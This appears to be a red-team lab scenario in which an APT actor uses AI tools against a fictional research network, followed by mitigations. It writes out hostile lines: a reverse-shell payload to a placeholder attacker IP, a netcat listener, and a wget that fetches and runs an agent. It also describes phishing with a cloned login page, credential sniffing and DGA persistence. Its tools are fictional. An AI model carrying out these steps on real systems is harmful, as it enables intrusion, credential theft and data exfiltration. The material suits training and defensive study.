# Operation Neural Ghost

Objective: Act as an APT actor (`APT-99`, "Deep Vector") to leverage AI and machine learning for reconnaissance, vulnerability discovery, phishing, and adaptive command-and-control, specifically targeting MycoSec's Linux-based research network.

Scenario: MycoSec's "Cortex" lab network uses standard security tools (firewalls, IDS, basic SIEM). Your goal is to use AI to bypass these defenses, find novel attack paths, and maintain stealthy persistence.

## Phase 1: AI-Assisted Reconnaissance & OSINT

Goal: Use AI to automate target discovery and vulnerability mapping.

Instructions:

1.  Deploy AI Recon Tool:
    *   On your attacker VM, launch the AI-powered reconnaissance tool `DarkTrace` (simulated for the lab).
    *   Command: `python3 darktrace_ai.py --target-domain myco.sec --output scan_results.json`
    *   This tool uses NLP to scrape public sources (GitHub, social media) for employee names, tech stacks, and potential leaks.

2.  Analyze Results with AI:
    *   The tool generates a report. Use an AI summarizer to extract key insights.
    *   Command: `python3 ai_analyzer.py --input scan_results.json --query "top 3 potential vulnerabilities"`
    *   Finding: The AI identifies:
        *   A developer mentioning a "test API" on an internal subdomain: `api-dev.myco.sec:8080`
        *   A old password pattern used in testing environments: `MycoDev[Year]!`
        *   The use of `Jenkins` for CI/CD at `jenkins.myco.sec`

3.  Probe Targets with AI-Generated Scans:
    *   Use an AI tool to generate polymorphic network scans that evade signature-based IDS.
    *   Command: `python3 ai_scanner.py --target api-dev.myco.sec --stealth-mode high`
    *   Finding: The scan reveals the API is running a vulnerable version of `FastAPI` with a known RCE (CVE-2023-xxxx).

Checkpoint: AI has identified a high-value target and a specific vulnerability.

## Phase 2: AI-Powered Social Engineering

Goal: Use a Generative AI to create a highly convincing phishing campaign.

Instructions:

1.  Generate Phishing Lure:
    *   Use a tailored LLM (e.g., a simulated internal tool `PhishGPT`) to craft a phishing email.
    *   Command: `python3 phishgpt.py --template "internal_alert" --target-role "developer" --output phishing_email.html`
    *   The AI generates an email pretending to be from "MycoSec IT Security" urging the developer to reset their password due to a false incident on the `api-dev` server.

2.  Deploy Credential Harvesting:
    *   The AI also generates a flawless clone of the MycoSec SSO login portal.
    *   Command: `deploy_phish_page --url https://myco-sec-login[.]xyz`
    *   Send the phishing email to targets identified in Phase 1.

3.  AI-Powered Interaction:
    *   Use an AI chatbot to handle victim interactions on the phishing site, answering questions to increase legitimacy.
    *   Command: `python3 ai_chatbot.py --port 8443 --persona "IT_Helpdesk"`

Checkpoint: AI has automated the creation and deployment of a highly convincing phishing campaign.

## Phase 3: AI-Enhanced Initial Access

Goal: Use AI to automate exploitation and initial payload delivery.

Instructions:

1.  Generate Polymorphic Payload:
    *   Use an AI tool to create a reverse shell payload that evades static AV analysis by mutating its code signature each time it's generated.
    *   Command: `python3 ai_payload_gen.py --payload linux_reverse_shell --lhost <ATTACKER_IP> --lport 4444 --output payload.py`
    *   Verification: The generated `payload.py` has a unique hash that does not appear on any virus scanning platform.

2.  Exploit the API Automatically:
    *   Use an AI exploitation framework to automatically weaponize the CVE against the `api-dev` server.
    *   Command: `python3 ai_exploit_framework.py --target http://api-dev.myco.sec:8080 --cve CVE-2023-xxxx --payload payload.py`
    *   Success: The framework successfully exploits the vulnerability and executes the payload.

3.  Catch the Shell:
    *   On your attacker VM, receive the reverse shell connection.
    *   Command: `nc -nvlp 4444`
    *   Verification: You have a shell on the `api-dev` server.

Checkpoint: AI has successfully exploited the target and established a foothold.

## Phase 4: Autonomous Lateral Movement

Goal: Use an AI agent to autonomously explore the network and pivot.

Instructions:

1.  Deploy AI Lateral Movement Agent:
    *   Upload and execute the `DeepExplorer` AI agent on the compromised host.
    *   Command (on target): `wget http://<ATTACKER_IP>/DeepExplorer.py && python3 DeepExplorer.py --mode autonomous`
    *   This agent will automatically:
        *   Map the local network
        *   Sniff credentials from memory
        *   Attempt to SSH to other machines using stolen keys or credentials
        *   Identify misconfigured services

2.  Review AI Findings:
    *   The agent reports its findings to your C2 server. Check the dashboard.
    *   Finding: The AI has discovered:
        *   SSH private key in a world-readable `/opt/scripts/` directory on another host (`data-server-03`).
        *   A `sudo` misconfiguration on `data-server-03` allowing the `devuser` to run `vim` as root.

3.  AI-Selected Pivot:
    *   The AI recommends pivoting to `data-server-03` as it is the most critical and vulnerable target. It automatically uses the stolen key to establish a SSH session.
    *   Verification: The AI agent reports: `[+] Successfully pivoted to host: data-server-03`

Checkpoint: An AI agent has autonomously moved laterally to a critical server.

## Phase 5: Adaptive Command & Control

Goal: Use AI to maintain stealthy C2 communication that adapts to network conditions.

Instructions:

1.  AI-Powered C2 Channel:
    *   The `DeepExplorer` agent establishes a C2 channel that uses AI to mimic legitimate network traffic (e.g., mimicking cloud provider API calls or DNS lookups).
    *   Command: The agent auto-selects the best exfiltration method based on network egress rules.

2.  Exfiltrate Data with AI:
    *   The AI identifies and exfiltrates target files from `data-server-03`. It encrypts and chunks the data, embedding it in what looks like normal HTTP traffic.
    *   Finding: The AI reports: `[+] Exfiltration of /opt/research/project_cobalt.tar.gz complete.`

3.  AI-Driven Persistence:
    *   The AI agent chooses the best persistence mechanism based on the environment.
    *   Action: It creates a systemd service on `data-server-03` that uses a domain generation algorithm (DGA) to call home, making it hard to blacklist.

Final Report: The AI system provides a full summary report. Document the key findings:
1.  Initial Vector: AI-driven recon found a vulnerable API endpoint and developer credentials.
2.  Lateral Movement Path: AI autonomously moved from `api-dev` to `data-server-03` via a stolen SSH key.
3.  Privilege Escalation: The AI identified and exploited a `sudo` misconfiguration on the final target.
4.  Exfiltration Method: AI chose DNS tunneling for C2 and exfiltration to avoid triggering firewall alerts.

Mitigations:
1.  Behavioral Analysis: Deploy EDR/NDR that uses its own AI to detect anomalous process chains and network flows, not just signatures.
2.  Zero Trust: Implement strict network segmentation and application allow-listing to limit lateral movement.
3.  AI-Powered Defense: Use defensive AI (like Darktrace or Vectra) to detect the low-and-slow, polymorphic network traffic generated by the attack AI.
4.  User Training: Conduct regular phishing exercises focused on identifying AI-generated content.
5.
